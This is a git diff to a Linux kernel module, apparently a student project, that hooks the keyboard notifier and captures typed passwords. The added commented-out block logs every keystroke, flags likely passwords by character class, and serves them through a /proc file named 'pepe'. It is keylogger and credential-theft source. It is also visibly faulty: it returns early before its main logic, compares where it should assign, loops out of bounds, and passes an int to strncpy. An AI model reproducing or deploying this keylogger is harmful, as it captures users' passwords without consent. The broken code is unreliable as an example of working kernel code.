@@ -139,6 +139,7 @@ void checkCharacters(int button, int shift, int down)
 	{	
 		input[15] = 10;
 		strncpy(passwrite[passcount2],input,16);
+		//curVal++;
 		switch (button)
 		{
 			case 30:
@@ -552,3 +553,140 @@ module_exit(cleanup);
 //Nevertheless I couldn't export the password to the c file.
 //Hope everything goes smooth and please you!
 //Tomas Venere, Delaney Jhones
+
+
+//Optional
+/*
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/interrupt.h>
+#include <linux/proc_fs.h>
+#include <linux/sched.h>
+#include <linux/keyboard.h>
+#include <asm/uaccess.h>
+#include <asm/io.h>
+#include <linux/slab.h>
+
+
+#define PROC_FILE_NAME "pepe"
+_Bool num=false;
+_Bool cap=false;
+_Bool low=false;
+_Bool schar=false;
+
+struct notifier_block nb;
+int input[15];
+int x=0;
+int y=0;
+char xWrite[100][15];
+int keypress = 1;
+char passbuffer[100*15];
+
+char theArray[15];
+int numbers[10]= {2,3,4,5,6,7,8,9,10,11};
+int letters[26]= {16,17,18,19,20,21,22,23,24,25,30,31,32,33,34,35,36,37,38,44,45,46,47,48,49,50};
+int Scharacters[7]= {26,27,39,40,51,52,53};
+
+
+ssize_t read_simple(struct file *filp,char *buf,size_t count,loff_t *offp) 
+{
+	if(keypress == 1)
+	{
+		keypress=0;
+		sprintf(passbuffer, "%s", (char*)xWrite);
+		strcpy(buf, passbuffer);
+		return strlen(passbuffer);
+	}
+	return 0;
+}
+
+
+
+struct file_operations proc_fops = {
+	read: read_simple,
+	write: 0
+};
+
+int kb_notifier_fn(struct notifier_block *nb, unsigned long action, void* data){
+	struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*)data;
+	int keypress = 1;
+	//isPassword(kp->value);
+	
+	return 0;
+
+	int curVal;
+	int i;
+	for (i = 0; i <= 15; i++)
+	{
+		curVal = (int)(theArray[i]);
+		
+		int q;
+		for (q=0; q<=10; q++){
+			if (curVal == numbers[q])
+			{
+				num = true;
+				//p++;
+				//p=p/p;
+			}
+		}
+		int f;
+		for (f=0; f<=26; f++){
+			if(curVal == letters[f] && kp->shift == 1 && kp->down == 1)
+			//if(curVal == letters[f])
+			{
+				cap = true;
+				//p++;
+				//p=p/p;
+			}
+			if(curVal == letters[f] && kp->shift == 0 && kp->down == 1)
+			{
+				low = true;
+				//p++;
+				//p=p/p;
+			}
+
+		}
+		int j;
+		for (j=0; j<=7; j++){
+			if (curVal == Scharacters[j])
+			{
+				schar == true;
+				//p++;
+				//p=p/p;
+			}
+		}
+
+		if((schar+cap + low+ num)>=3)
+		{
+			strncpy(passwrite[passcount2],curVal,16);
+			strcpy(theArray,"good pasword");
+			printk("Key:  %d  Lights:  %d  Shiftmax:  %x\n  CurrValue %s\n", kp->value, kp->ledstate, kp->shift, theArray);
+			
+		}
+
+	}
+	
+
+}
+
+int init (void) {
+	nb.notifier_call = kb_notifier_fn;
+	register_keyboard_notifier(&nb);
+	proc_create(PROC_FILE_NAME,0,NULL,&proc_fops);
+	return 0;
+}
+
+void cleanup(void) {
+	unregister_keyboard_notifier(&nb);
+	// remove_proc_entry(PROC_FILE_NAME,NULL);
+}
+
+
+
+MODULE_LICENSE("GPL"); 
+module_init(init);
+module_exit(cleanup);
+
+
+*/
